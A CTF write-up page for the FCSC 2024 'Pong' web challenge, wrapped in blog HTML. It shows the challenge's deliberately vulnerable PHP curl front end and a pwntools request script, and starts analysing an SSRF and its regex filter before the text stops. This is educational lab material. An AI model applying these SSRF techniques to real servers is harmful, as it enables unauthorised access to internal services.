@@ -1,0 +1,2028 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.14549c76bbc96f0af1574b0259efd70e52908cd36fb4d14ed3d290a1b6479eae.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Pong [EN]| FCSC 2024</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Pong&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Pong&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Pong&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Pong&#32;[EN]|&#32;FCSC&#32;2024 />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Here&#39;s a full writeup of the &#39;Pong&#39; web challenge created by Bitk &amp; Mizu at FCSC 2024." />
+<meta itemprop="description" content="Here&#39;s a full writeup of the &#39;Pong&#39; web challenge created by Bitk &amp; Mizu at FCSC 2024." />
+<meta property="og:description" content="Here&#39;s a full writeup of the &#39;Pong&#39; web challenge created by Bitk &amp; Mizu at FCSC 2024." />
+<meta name="twitter:description" content="Here&#39;s a full writeup of the &#39;Pong&#39; web challenge created by Bitk &amp; Mizu at FCSC 2024." />
+
+
+<base href="https://vozec.github.io/writeups/pong-fcsc2024-en/" />
+<link rel="canonical" href="https://vozec.github.io/writeups/pong-fcsc2024-en/" itemprop="url" />
+<meta name="url" content="https://vozec.github.io/writeups/pong-fcsc2024-en/" />
+<meta name="twitter:url" content="https://vozec.github.io/writeups/pong-fcsc2024-en/" />
+<meta property="og:url" content="https://vozec.github.io/writeups/pong-fcsc2024-en/" />
+
+
+<meta property="og:updated_time" content="2024-04-12T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://vozec.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.110.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://vozec.github.io/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="https://vozec.github.io/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://vozec.github.io/writeups/pong-fcsc2024-en/">Pong [EN]| FCSC 2024</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-04-12T12:00:00Z" class="post-date">
+        April 12, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>18 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-curl">
+        <a href="https://vozec.github.io/tags/curl">curl</a>
+      </li>
+      
+      <li class="tag-ssrf">
+        <a href="https://vozec.github.io/tags/ssrf">ssrf</a>
+      </li>
+      
+      <li class="tag-php">
+        <a href="https://vozec.github.io/tags/php">php</a>
+      </li>
+      
+      <li class="tag-gopher">
+        <a href="https://vozec.github.io/tags/gopher">gopher</a>
+      </li>
+      
+      <li class="tag-cve">
+        <a href="https://vozec.github.io/tags/cve">cve</a>
+      </li>
+      
+      <li class="tag-tornado">
+        <a href="https://vozec.github.io/tags/tornado">tornado</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h1 id="introduction">Introduction</h1>
+<pre tabindex="0"><code>Ping.
+
+Note : l&#39;infra n&#39;a pas accès à internet.
+</code></pre><p>The sources for this challenge are provided:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>└── src
+</span></span><span style="display:flex;"><span>    ├── backend
+</span></span><span style="display:flex;"><span>    │   ├── Dockerfile
+</span></span><span style="display:flex;"><span>    │   └── src
+</span></span><span style="display:flex;"><span>    │       ├── app.py
+</span></span><span style="display:flex;"><span>    │       ├── public
+</span></span><span style="display:flex;"><span>    │       │   ├── index.html
+</span></span><span style="display:flex;"><span>    │       │   └── js
+</span></span><span style="display:flex;"><span>    │       │       └── main.js
+</span></span><span style="display:flex;"><span>    │       └── requirements.txt
+</span></span><span style="display:flex;"><span>    ├── dns
+</span></span><span style="display:flex;"><span>    │   ├── Dockerfile
+</span></span><span style="display:flex;"><span>    │   └── src
+</span></span><span style="display:flex;"><span>    │       ├── dns_server.py
+</span></span><span style="display:flex;"><span>    │       └── requirements.txt
+</span></span><span style="display:flex;"><span>    ├── flag
+</span></span><span style="display:flex;"><span>    │   ├── Dockerfile
+</span></span><span style="display:flex;"><span>    │   └── src
+</span></span><span style="display:flex;"><span>    │       ├── app.js
+</span></span><span style="display:flex;"><span>    │       └── package.json
+</span></span><span style="display:flex;"><span>    └── frontend
+</span></span><span style="display:flex;"><span>        ├── Dockerfile
+</span></span><span style="display:flex;"><span>        └── src
+</span></span><span style="display:flex;"><span>            ├── curl-7.71.0.tar.gz
+</span></span><span style="display:flex;"><span>            └── index.php
+</span></span></code></pre></div><p>The challenge consists of 4 machines:</p>
+<ul>
+<li>a frontend server</li>
+<li>a backend server</li>
+<li>a dns server</li>
+<li>a flag server</li>
+</ul>
+<p>The service names defined in the <code>docker-compose.yml</code> file are:</p>
+<ul>
+<li><em>pong-frontend</em></li>
+<li><em>pong-backend</em></li>
+<li><em>pong-internal-dns</em></li>
+<li><em>pong-flag</em></li>
+</ul>
+<p>This detail will be important for the future.</p>
+<p>The application exposes a single <strong>8000</strong> port on which <em>pong-frontend</em> is exposed; this is our entry point.</p>
+<h1 id="pong-frontend-analysis">Pong-frontend analysis</h1>
+<p>Here are the contents of <code>index.php</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;source&#34;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#e6db74">&#34;index.php&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$_GET[<span style="color:#e6db74">&#34;game&#34;</span>] <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;game&#34;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;pong&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/&#34;</span>, $_GET[<span style="color:#e6db74">&#34;game&#34;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;403 Forbidden!&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
+</span></span><span style="display:flex;"><span>$options <span style="color:#f92672">=</span> [ <span style="color:#a6e22e">CURLOPT_URL</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">.</span> $_GET[<span style="color:#e6db74">&#34;game&#34;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.fcsc2024.fr:5000&#34;</span> ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;options&#34;</span>])) {
+</span></span><span style="display:flex;"><span>    $options <span style="color:#f92672">+=</span> $_GET[<span style="color:#e6db74">&#34;options&#34;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_setopt_array</span>($ch, $options);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_exec</span>($ch);
+</span></span></code></pre></div><p>It is possible to provide <code>2</code> parameters to the app, the <code>game</code> parameter and the <code>options</code> one.</p>
+<p>A <code>game</code> check is performed with a regex, then the application performs a query on <code>http://&lt;game&gt;.fcsc2024.fr:5000&quot;</code>.<br>
+Finally, if <em>REMOTE_ADDR</em> is equal to <code>127.0.0.1</code>, then the specified options are added to the curl request.<br>
+Obviously, the following challenge starts with a Server Side Request Forgery (SSRF).</p>
+<p>To give you a clearer idea of what&rsquo;s involved, here&rsquo;s the code base I used to send my requests:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>, ssl<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/?game=pong
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Upgrade-Insecure-Requests: 1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>print(result<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><h2 id="first-vulnerability-on-frontendfcsc2024fr">First vulnerability on frontend.fcsc2024.fr</h2>
+<p>The first thing that intrigued me was the use of this regex: <code>&quot;/[^a-z\.]|((.{10,})+\.)+$|[a-z]{10,}/&quot;</code>, in theory, this forces the user to enter:</p>
+<ul>
+<li>A character string with the letters <code>abcdefghijklmnopqrstuvwxyz.</code>.</li>
+<li>A character string up to 9 characters long.</li>
+</ul>
